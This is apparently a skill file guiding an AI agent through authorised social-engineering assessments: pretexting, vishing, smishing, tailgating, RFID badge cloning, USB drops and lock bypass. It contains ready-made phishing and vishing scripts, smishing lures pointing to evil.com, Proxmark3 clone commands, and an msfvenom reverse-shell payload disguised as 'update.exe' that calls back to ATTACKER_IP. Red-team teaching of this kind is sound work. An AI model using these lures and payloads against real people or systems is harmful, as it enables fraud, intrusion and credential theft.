---
name: social-engineering
description: "Social engineering beyond phishing: pretexting, vishing, smishing, physical SE, USB drops, and RFID cloning"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["social engineering", "pretexting", "vishing", "smishing", "physical social engineering", "usb drop", "rfid cloning", "dumpster diving", "tailgating", "impersonation"]
mitreAttack: ["T1598", "T1091", "T1189"]
owaspRefs: ["OWASP Top 10 A07:2021 Identification and Authentication Failures"]
---

# Social Engineering

## When to Use

- You are conducting an authorized physical security assessment
- You need to test employee security awareness beyond email phishing
- You are assessing physical access controls and badge security
- Testing whether employees follow security protocols under social pressure

## Do Not Use

- To deceive or manipulate people outside of authorized engagements
- To gain unauthorized physical access to facilities
- To harass, threaten, or endanger individuals

## Auth Context

Social engineering is part of physical security assessments. All activities require explicit written authorization and defined rules of engagement.

---

## Pretexting

### Common Pretexts

| Pretext | Scenario | Target |
|---------|----------|--------|
| IT Support | "I'm from IT, need to update your machine" | Employees |
| Delivery | "Package delivery, need someone to sign" | Reception |
| New Employee | "I'm new, can you let me in?" | Any employee |
| Vendor | "I'm here for scheduled maintenance" | IT/Facilities |
| Executive | "I'm the CEO, I need this done now" | Junior staff |

### Pretext Development

```bash
# Research target organization
# - LinkedIn: employee names, roles, recent hires
# - Website: org chart, office locations, technologies used
# - Social media: employee interests, events, culture
# - Job postings: current tech stack, team structure

# Create believable backstory
# - Consistent details (name, role, phone, email)
# - Knowledge of internal systems/processes
# - Appropriate dress and demeanor
# - Confidence without arrogance
```

---

## Vishing (Voice Phishing)

### Infrastructure

```bash
# VoIP setup
# - Twilio: programmable voice
# - Asterisk: self-hosted PBX
# - Caller ID spoofing:SpoofCard, CallFire

# Script development
# - Start with urgency or authority
# - Use organization-specific terminology
# - Have a believable reason for calling
# - Offer to "help" or "resolve an issue"
```

### Common Vishing Scenarios

```bash
# IT Help Desk impersonation
"Hi, this is IT support. We detected unusual activity on your account. 
I need to verify your credentials to secure it."

# Executive impersonation
"This is [CEO name]. I'm in a meeting and need you to 
purchase gift cards for the team. Can you handle this?"

# Vendor impersonation
"Hi, I'm from [vendor name]. We need to update your 
subscription. Can you confirm your account details?"
```

---

## Smishing (SMS Phishing)

### Payloads

```bash
# Account verification
"Your account has been locked. Verify your identity: https://evil.com/verify"

# Package delivery
"Your package delivery failed. Reschedule: https://evil.com/reschedule"

# IT notification
"Your VPN access expires today. Renew here: https://evil.com/renew"
```

---

## Physical Social Engineering

### Tailgating/Piggybacking

```bash
# Follow employees through secure doors
# Carry boxes to appear as delivery/vendor
# Time entry during high-traffic periods
# Use phone call as distraction
```

### RFID Badge Cloning

```bash
# Proxmark3 operations
# Read badge
proxmark3> lf hid read
proxmark3> lf hid clone -r <raw_data>

# Cloning tools
# - Proxmark3: professional RFID tool
# - Arduino + RFID shield: DIY clone
# - Flipper Zero: portable multi-tool
```

### USB Drop

```bash
# Create payloads
msfvenom -p windows/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe > update.exe

# Label drives convincingly
# "Salary Information 2024"
# "Confidential - Do Not Distribute"
# "IT Backup - Do Not Delete"

# Drop locations
# - Parking lots
# - Smoking areas
# - Break rooms
# - Conference rooms
```

### Lock Picking/Bypass

```bash
# Bypass techniques
# - Lock bumping: modified key + hammer
# - Credit card bypass: latch-style locks
# - Under-door tool: handle manipulation
# - Social engineering: "I forgot my badge"

# Tools
# - Pick set (rakes, hooks, tension wrenches)
# - Bump keys
# - Under-door tools
# - Credit card shims
```

---

## Dumpster Diving

### What to Look For

```bash
# Documents
# - Internal memos, org charts
# - Passwords on sticky notes
# - Network diagrams
# - Employee directories
# - Old badges/ID cards

# Hardware
# - Old hard drives
# - USB drives
# - Configuration sheets
# - Backup tapes
```

---

## OSINT for Social Engineering

### Reconnaissance

```bash
# LinkedIn
# - Employee names and roles
# - Reporting structure
# - Recent hires/leavers
# - Technology skills

# Social media
# - Facebook/Instagram: interests, events, location
# - Twitter: opinions, company mentions
# - GitHub: code, internal project names

# Job postings
# - Tech stack details
# - Team structure
# - Security tools in use
```

---

## Cheat Sheet — Quick Reference

| Technique | Tool/Method | Target |
|-----------|-------------|--------|
| Pretexting | Research + script | Employees |
| Vishing | Twilio/Asterisk + script | Phone users |
| Smishing | SMS gateway + link | Mobile users |
| Tailgating | Physical presence | Secure doors |
| RFID clone | Proxmark3 | Badge systems |
| USB drop | msfvenom + labeled drives | Employees |
| Lock bypass | Pick set / bump key | Physical locks |
| Dumpster dive | Physical access | Trash/recycling |

---

## Anti-Hallucination

- Social engineering requires explicit written authorization — never execute without it
- Document the exact pretext, target, and outcome for each finding
- Physical security findings should include: location, time, employee involved, and what was accessed
- USB drop findings should include: drop location, time to pickup, and whether payload was executed
- Never claim "all employees would fall for this" — document specific test results only
